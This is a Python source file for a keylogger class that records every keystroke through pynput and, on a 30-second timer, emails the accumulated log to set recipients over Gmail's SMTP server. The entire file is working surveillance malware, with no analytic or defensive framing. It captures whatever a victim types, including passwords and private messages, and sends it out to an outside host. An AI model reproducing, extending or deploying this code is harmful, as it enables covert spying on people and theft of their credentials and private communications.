#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
import os

from termcolor import colored
from email.mime.text import MIMEText

class Keylogger:

    def __init__(self, sender, password, recipients):
        self.log = ""
        self.request_shutdown = False
        self.is_first_run = True
        self.timer = None

        self.sender = sender
        self.recipients = recipients
        self.__password = password

    def process_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += " " if "space" in str(key) else f" {str(key).split('.')[1].upper()} "

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            try:
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, recipients, msg.as_string())
            except smtplib.SMTPAuthenticationError:
                print(colored("\n[!] Incorrect credentials to send email.\n", "red"))
                self.shutdown()
                os._exit(1)

    def clear_log(self):
        self.log = "\n[+] The keylogger has been initialized\n" if self.is_first_run else self.log
        if self.is_first_run:
            print(colored("\n[+] Capturing keys...\n", "blue"))
        self.send_email("keylogger", self.log, self.sender, self.recipients, self.password)
        self.log = ""
        self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.clear_log)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        try:
            self.timer.cancel()
        except:
            pass

    def start(self):
        keylogger = pynput.keyboard.Listener(on_press=self.process_key)
        
        with keylogger:
            self.clear_log()
            keylogger.join()

    @property
    def password(self):
        return self.__password
